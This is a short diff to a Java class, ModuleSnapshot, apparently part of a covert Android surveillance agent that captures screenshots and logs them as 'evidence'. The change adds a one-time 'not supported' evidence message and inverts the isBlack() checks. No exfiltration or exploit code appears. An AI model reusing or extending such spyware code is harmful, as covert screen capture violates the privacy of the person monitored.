@@ -43,6 +43,7 @@ import com.android.mm.M;
 
 /**
  * The Class SnapshotAgent.
+ * "screenshot"
  */
 public class ModuleSnapshot extends BaseInstantModule {
 
@@ -72,6 +73,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 	private boolean frameBuffer = true;
 	private boolean screenCap = true;
+	boolean infoScreenSent = false;
 
 	/*
 	 * (non-Javadoc)
@@ -145,10 +147,16 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				if (!frameBuffer && !screenCap) {
+
+					if (!infoScreenSent) {
+						EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
+						infoScreenSent = true;
+					}
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart) Screenshot not supported");
 					}
 				}
+
 			} catch (final Exception ex) {
 				if (Cfg.EXCEPTION) {
 					Check.log(ex);
@@ -372,10 +380,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private boolean isBlack(byte[] raw) {
 		for (int i = 0; i < raw.length; i++) {
 			if (raw[i] != 0) {
-				return true;
+				return false;
 			}
 		}
-		return false;
+		return true;
 	}
 
 	private boolean isTablet() {
